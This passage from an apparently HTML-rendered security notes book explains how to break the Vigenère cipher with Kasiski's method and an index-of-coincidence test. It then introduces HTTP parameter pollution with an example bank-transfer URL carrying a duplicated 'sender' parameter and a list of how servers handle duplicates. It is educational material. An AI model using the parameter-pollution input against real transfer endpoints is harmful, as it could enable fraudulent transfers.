<p>This cipher is a more advanced version of the shift cipher. It is a <em>poly-alphabetic</em> shift cipher. Unlike the previous ciphers, it does not define a fixed mapping on a letter-by-letter basis. Instead, it maps blocks of letters whose size depends on the key length. For example, <code>ab</code> could be mapped to <code>xy</code>, <code>ac</code> to <code>zt</code>, and <code>aa</code> to <code>bc</code>. Moreover, identical blocks will be mapped to different blocks depending on their relative position in the plaintext. <code>ab</code> could once be mapped to <code>xy</code>, but then when <code>ab</code> appears again, it may be mapped to <code>ci</code>.</p>
<p>In the Vigenère cipher the key is no longer a single number, but rather a string of letters, where each letter is again mapped to the integers \( \{0,...,25\} \). The key is then repeatedly overlaid with the plaintext and each letter in the plaintext is shifted by the amount denoted by the key letter it has been matched with.</p>
<pre><code>Plaintext:  the golden sun shone brightly, bathing the beach in its warm sunlight
Key:        cok ecokec oke cokec okecokec, okecoke cok ecoke co kec okec okecokec
Ciphertext: vvo kqznip ger uvyrg pbmivdpa, pkxjwxk vvo fgoml kb sxu kkvo gernwqlv
</code></pre>
<p>Given a known key length, also called a period, \( t \), a ciphertext \( c = c_1 \cdot\cdot\cdot c_l \) can be divided into parts, each with length \( t \). Therefore, ciphertext characters with the same relative position in each of these groups with length \( t \) would have all been encrypted using the same shift amount. In the above example, for the groups <code>theg</code> and <code>olde</code>, <code>t</code> and <code>o</code> would have both been encrypted with <code>c</code>, <code>h</code> and <code>l</code> with <code>o</code> and so on. Such characters are said to comprise a <em>stream</em>. Stated in a more mathematical way, for all \( j \in \{1,...,t\} \), the ciphertext characters \( c_j,c_{j+t},c_{j+2t},... \) have all been encrypted by shifting the corresponding plaintext character by \( k_j \) positions, where \( k_j \) is the \( j \)th character in the key \( k \). It is now possible to use frequency analysis on each stream and check what shift amount yields the correct probability distribution.</p>
<p>If the period \( t \) is not known, it may be possible to determine it by using Kasiski's method. Initially, you must identify repeated patterns of length 2-3 characters. Kasiski observed that the distance between these repeated patterns (given that they are not coincidental) is a multiple of the period \( t \). In the above example, the distance between the two <code>vvo</code>s is 32 which is 8 times the period 4. </p>
<p>There is also a more automatable (if this is even a word) approach. Recall that, given a period \( t \), the ciphertext characters in the first stream 
$$c_1,c_{1+t},c_{1+2t},...$$
are the upshot of encrypting the corresponding plaintext characters with the same shift amount. Therefore, the frequencies of the characters in the stream will be close to the character frequencies in the English language in some shifted order. </p>
<p>If we let \( q_i \) denote the observed frequency of the \( i \)th letter in the stream (\( q_i = \frac{\text{number of occurrences of the ith letter of the alphabet}}{\text{length of the stream}} \)), we would expect that \( q_{i+j \mod 26} \approx p_i \), where \( j \) is the shift amount and \( p_i \) is the frequency of the \( i \)th letter of the alphabet in a standard English text. Therefore, the sequence \( q_0,q_1,...q_{25} \) is simply the sequence \( p_0,p_1,...,p_{25} \) shifted by \( j \).</p>
<p>Referring back to previous analysis, we get that </p>
<p>$$\sum_{i=0}^{25}q_i^2=\sum_{i=0}^{25}p_i^2 \approx 0.065$$
We can easily find the period \( t \). For every \( \tau =1,2,... \) and the stream \( c_1,c_{1+\tau},c_{1+2\tau},... \) we can define</p>
<p>$$S_{\tau} \overset{\mathrm{def}}{=} \sum_{i=0}^{25}q_i^2$$</p>
<p>When \( \tau=t \), it is expected that \( S_{\tau} \approx 0.065 \). In the rest of the cases, we would expect that the character distribution in the stream is fairly uniform (recall that the Vigenère cipher smooths out character distributions) and so </p>
<p>$$S_{\tau} = \sum_{i=0}^{25} \left(\frac{1}{26}\right)^2 \approx 0.038$$
Ergo, the smallest value \( \tau \), for which \( S_{\tau} \approx 0.065 \), is likely the period \( t \). This can be further validated by performing the same procedure on the subsequent streams in the ciphertext such as \( c_2,c_{2+\tau},c_{2+2\tau},... \) and so on.</p>
<div style="break-before: page; page-break-before: always;"></div><div style="break-before: page; page-break-before: always;"></div><h1 id="web-1"><a class="header" href="#web-1">Web</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="overview-11"><a class="header" href="#overview-11">Overview</a></h1>
<p>Different web servers handle duplicating parameters in a variety of ways. An example of duplicate parameters would be:</p>
<pre><code>https://www.bank.com/transfer?sender=abcdef&amp;amount=1000&amp;recipient=ghijkl&amp;sender=ABCDEF
</code></pre>
<p>Here, there are two <code>sender=</code> parameters.</p>
<h1 id="handling"><a class="header" href="#handling">Handling</a></h1>
<ul>
<li>Apache - uses the last occurrence</li>
<li>Apache Tomcat - uses the first occurrence</li>
<li>ASP - uses all occurrences</li>
<li>ISP - uses all occurrences</li>
</ul>
<p>A more exhaustive list may be found at https://owasp.org/www-pdf-archive/AppsecEU09_CarettoniDiPaola_v0.8.pdf. </p>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>




        <script type="text/javascript">
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>

        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->

        <script type="text/javascript">
        window.addEventListener('load', function() {
            MathJax.Hub.Register.StartupHook('End', function() {
                window.setTimeout(window.print, 100);
            });
        });
        </script>

    </body>
</html>
